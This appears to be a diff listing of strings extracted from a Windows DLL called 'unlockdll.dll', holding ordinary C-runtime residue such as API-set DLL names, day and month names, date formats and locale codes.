+?$?,?4?<?D?L?T?\?d?l?t?|?
+0$0,040<0D0L0T0\0d0l0t0|0
+1$1,141<1D1L1T1\1d1l1t1|1
+2$2,242<2D2L2T2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4l4t4|4
+? ?(?0?8?@?H?P?X?`?h?p?x?
+0 0(00080@0H0P0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+< <$<,<D<T<X<h<l<t<
+=(=8=<=L=P=T=\=t=
+2,20282@2H2L2T2h2p2x2
+30383<3L3p3|3
+4(4H4h4
+5(5D5H5h5
+6(6H6h6
+7(7D7H7d7h7
+014181<1@1D1H1L1P1T1`1d1h1l1p1t1x1|1
+202<2@2D2`2d2 9$9P9x9
+jjjjjj
+#+3;CScs
+unlockdll.dll
+unlockdll.dll
+#+3;CScs
+Mapi-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+mscoree.dll
+         (((((                  H
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+Mapi-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l1-2-2
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+api-ms-win-appmodel-runtime-l1-1-2
+user32
+ext-ms-
+Mja-JP
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+#+3;CScs
